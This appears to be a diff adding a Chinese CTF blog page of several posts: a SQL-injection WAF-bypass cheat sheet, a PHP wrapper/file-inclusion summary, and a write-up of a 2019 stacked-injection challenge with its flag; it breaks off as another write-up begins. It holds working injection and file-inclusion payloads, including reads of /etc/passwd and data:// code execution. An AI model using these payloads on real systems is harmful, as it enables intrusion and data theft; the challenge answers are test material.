@@ -71,6 +71,545 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CTF-Web-SQL注入WAF绕过姿势" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date">
+  <time class="dt-published" datetime="2021-01-25T07:21:00.000Z" itemprop="datePublished">2021-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingwuyou/p/10687462.html">https://www.cnblogs.com/qingwuyou/p/10687462.html</a></p>
+<h1 id="（1）大小写绕过"><a href="#（1）大小写绕过" class="headerlink" title="（1）大小写绕过"></a>（1）大小写绕过</h1><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 </p>
+<h1 id="（2）替换关键字"><a href="#（2）替换关键字" class="headerlink" title="（2）替换关键字"></a>（2）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;index.php?page_id&#x3D;-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h1 id="（3）空格绕过"><a href="#（3）空格绕过" class="headerlink" title="（3）空格绕过"></a>（3）空格绕过</h1><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;&#x2F;*&#x2F;&#x2F;from&#x2F;**&#x2F;yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车</span><br><span class="line"></span><br><span class="line">&#x2F;!select&#x2F;&#x2F;!**&#x2F;&#x2F;!from&#x2F;&#x2F;!yz*&#x2F;;</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a&#x3D;1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="（4）替换关键字"><a href="#（4）替换关键字" class="headerlink" title="（4）替换关键字"></a>（4）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="（5）URL编码"><a href="#（5）URL编码" class="headerlink" title="（5）URL编码"></a>（5）URL编码</h1><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">insert&#x3D;link-&gt;query(urldecode($_GET[&#39;id&#39;]));</span><br><span class="line"></span><br><span class="line">row&#x3D;insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from %2579%257a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="（6）十六进制绕过（引号绕过）"><a href="#（6）十六进制绕过（引号绕过）" class="headerlink" title="（6）十六进制绕过（引号绕过）"></a>（6）十六进制绕过（引号绕过）</h1><p>在SQL语句的数据区域可以采用十六进制绕过敏感词汇</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select a from yz where b&#x3D;0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;0x7573657273</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="（7）逗号绕过"><a href="#（7）逗号绕过" class="headerlink" title="（7）逗号绕过"></a>（7）逗号绕过</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br></pre></td></tr></table></figure>
+<p>同时也可以利用替换函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select left(database(),2)&gt;&#39;tf&#39;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>
+<h1 id="（8）比较符-lt-gt-绕过"><a href="#（8）比较符-lt-gt-绕过" class="headerlink" title="（8）比较符(&lt;,&gt;)绕过"></a>（8）比较符(&lt;,&gt;)绕过</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#39;asd&#39;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br></pre></td></tr></table></figure>
+<p>新学习了一种骚骚的注入姿势in、between、order by</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from yz where a in (&#39;aaa&#39;); </span><br><span class="line">select substr(a,1,1) in (&#39;a&#39;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#39;a&#39; and &#39;b&#39;; </span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也可以用like，根据排列顺序进行真值判断</p>
+<h1 id="（9）注释符绕过"><a href="#（9）注释符绕过" class="headerlink" title="（9）注释符绕过"></a>（9）注释符绕过</h1><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技<br>select 1,2,3 from yz where ‘1’/1=(1=1)/‘1’=’1’<br>(1=1)中就有了判断位为下面的注入打下基础</p>
+<h1 id="（10）宽字节绕过"><a href="#（10）宽字节绕过" class="headerlink" title="（10）宽字节绕过"></a>（10）宽字节绕过</h1><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>注：<code>select</code>防止用户自定义的名称和mysql保留字冲突</p>
+<h1 id="（11）with-rollup"><a href="#（11）with-rollup" class="headerlink" title="（11）with rollup"></a>（11）with rollup</h1><p>一般结合group by使用</p>
+<p> select 1 as test from yz group by test with rollup limit 1 offset 1;</p>
+<p>+——+</p>
+<p>| test |</p>
+<p>+——+</p>
+<p>| NULL |</p>
+<p>+——+</p>
+<h1 id="（12）无列名注入"><a href="#（12）无列名注入" class="headerlink" title="（12）无列名注入"></a>（12）无列名注入</h1><p>给未知列名起别名<br>select a from (select 1,2,3aunion select * from yz)v;</p>
+<h1 id="（13）-判断列数绕过"><a href="#（13）-判断列数绕过" class="headerlink" title="（13） 判断列数绕过"></a>（13） 判断列数绕过</h1><p>当order by 被过滤后就可以使用into 变量来绕过<br>select * from yz limit 1,1 into @a,@b,@c;</p>
+<h1 id="3-SQL注入知识"><a href="#3-SQL注入知识" class="headerlink" title="3.SQL注入知识"></a>3.SQL注入知识</h1><p>1.SQL越界 ，也就是能执行自己的sql语句<br>2.盲注的话找一个点可以控制两种不同的反应<br>3.取数据并做真值判断<br>4.写脚本暴库</p>
+<p>上边是基于一般的注入题目的解题步骤，如果有特殊条件也可灵活变通</p>
+<h1 id="mysql数据库元信息"><a href="#mysql数据库元信息" class="headerlink" title="mysql数据库元信息"></a>mysql数据库元信息</h1><p>在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称<br>和访问权限。在informa_schema中常用的表有:</p>
+<p>schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。<br>tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。<br>show tables from secuiry的结果就是来自这个表<br>columns:详细地描述了某张表的所有的列以及每个列的信息。<br>show columns from users的结果就是来自这个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select database(); #查选数据库</span><br><span class="line"></span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata limit 0,1 #查询数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1; #查询表</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1; #查询列</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" data-id="ckkdrz0yv0000ugusa4k3041i" data-title="SQL注入WAF绕过姿势" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTF-wp-wechall答案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" class="article-date">
+  <time class="dt-published" datetime="2021-01-24T07:38:22.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/">wechall答案</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Training-Get-Sourced"><a href="#Training-Get-Sourced" class="headerlink" title="Training: Get Sourced"></a>Training: Get Sourced</h1><p>看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You are looking for this password: html_sourcecode --&gt;     </span><br></pre></td></tr></table></figure>
+<p>提交html_sourcecode即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" data-id="ckkdrz0z00003ugus79z2hkub" data-title="wechall答案" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTF-Web-php伪协议总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" class="article-date">
+  <time class="dt-published" datetime="2021-01-22T06:44:29.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/">php伪协议总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.html，https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
+<p>在不同的伪协议中，需要allow_url_fopen和allow_url_include的开启状态是不同的</p>
+<h1 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 访问本地文件</span><br><span class="line"># 不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd</span><br></pre></td></tr></table></figure>
+<h1 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>是一种元封装器，设计用于数据流打开时的筛选过滤应用<br>不受allow_url_open和allow_url_include影响</p>
+<h3 id="四个参数"><a href="#四个参数" class="headerlink" title="四个参数"></a>四个参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br><span class="line"># 把输入流进行base64编码</span><br></pre></td></tr></table></figure>
+<p>转换过滤器：convert.base64-encode，convert.base64-decode</p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流，读取post中未解析的原始数据</p>
+<p>需要allow_url_include开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取post数据</span><br><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;cmd.php?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
+<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><p>数据流封装器</p>
+<p>需要allow_urul_ioncludeallow_url_include打开</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="zip-，bzip2-，zlib"><a href="#zip-，bzip2-，zlib" class="headerlink" title="zip://，bzip2://，zlib://"></a>zip://，bzip2://，zlib://</h1><p>用于打开压缩文件</p>
+<p>不受allow_url_fopen和allow_url_include的影响</p>
+<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;zip:&#x2F;&#x2F;C:\Users\liuxianglai\Desktop\test.jpg%23zip.txt</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;Users&#x2F;liuxianglai&#x2F;Desktop&#x2F;test.bz2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" data-id="ckkdrz0yz0002ugus16vv6brh" data-title="php伪协议总结" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTF-Web-SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2021-01-20T00:47:08.000Z" itemprop="datePublished">2021-01-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQL注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>题目来源：强网杯2019</p>
+<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
+<p>考察：堆叠注入，sql的show语句，sql的预编译，sql修改表</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chalan630/p/12583667.html%EF%BC%8Chttps://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://www.cnblogs.com/chalan630/p/12583667.html，https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
+<p>测试语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<p>能够得出输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>时一样的回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39;   			# 报错</span><br><span class="line">1&#39;--+  			# 正常且为True</span><br><span class="line">1&#39; and 1&#x3D;1 --+  # 正常且为True</span><br><span class="line">1&#39; and 1&#x3D;2 --+  # 正常且为False</span><br><span class="line">?inject&#x3D;1&#39; order by 3--+ # error 1054 : Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br><span class="line">inject&#x3D;1&#39;; show tables; --+ $ # 1919810931114514 words</span><br><span class="line">?inject&#x3D;1&#39;; show columns from words; --+ # </span><br><span class="line">show columns from &#96;1919810931114514&#96;;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words &#123;</span><br><span class="line">id int(10);</span><br><span class="line">data varchar(20);</span><br><span class="line">&#125;</span><br><span class="line">1919810931114514&#123;</span><br><span class="line">flag varchar(100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload1：修改表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;; rename table &#96;words&#96; to &#96;words1&#96;; rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(100) character set utf8 collate utf8_general_ci not null;--+</span><br></pre></td></tr></table></figure>
+<p>payload2：预编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;Set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare s from @a; execute s; --+</span><br></pre></td></tr></table></figure>
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34745aea-2541-43e6-884f-c67988afc34a&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="sql正常注入流程"><a href="#sql正常注入流程" class="headerlink" title="sql正常注入流程"></a>sql正常注入流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 # 正常输入</span><br><span class="line">1&#39; # 若报错，则单引号为可能的注入点</span><br><span class="line">1&#39; --+ # 判断注入类型</span><br><span class="line">1&#39; and 1&#x3D;1 --+ # 判断注入类型</span><br><span class="line">1&#39; and 1&#x3D;2 --+ # 判断注入类型</span><br><span class="line"></span><br><span class="line">1&#39; order by 3 --+ # 判断列数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="sql的show命令"><a href="#sql的show命令" class="headerlink" title="sql的show命令"></a>sql的show命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show table from db_name;</span><br><span class="line">show engine;</span><br><span class="line">show character set; #显示支持哪些字符集</span><br><span class="line">show columns;</span><br><span class="line">show create databases; #显示已经创建的库，创建时的语句</span><br><span class="line">show create table; #显示已经创建的表，创建时的语句</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><p>添加分号;即可实现同一行执行多个sql语句</p>
+<h2 id="sql修改表"><a href="#sql修改表" class="headerlink" title="sql修改表"></a>sql修改表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table &#96;words&#96; to &#96;test&#96;;</span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);</span><br></pre></td></tr></table></figure>
+<h2 id="sql预编译"><a href="#sql预编译" class="headerlink" title="sql预编译"></a>sql预编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SET;									# 用于设置变量名和值</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">EXECUTE stmt_name;			 			# 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# 用来释放掉预处理的语句</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">execute stmt;</span><br></pre></td></tr></table></figure>
+<h1 id="hack-world"><a href="#hack-world" class="headerlink" title="hack world"></a>hack world</h1><p>来源：[CISCN2019 华北赛区 Day2 Web1]</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World</a></p>
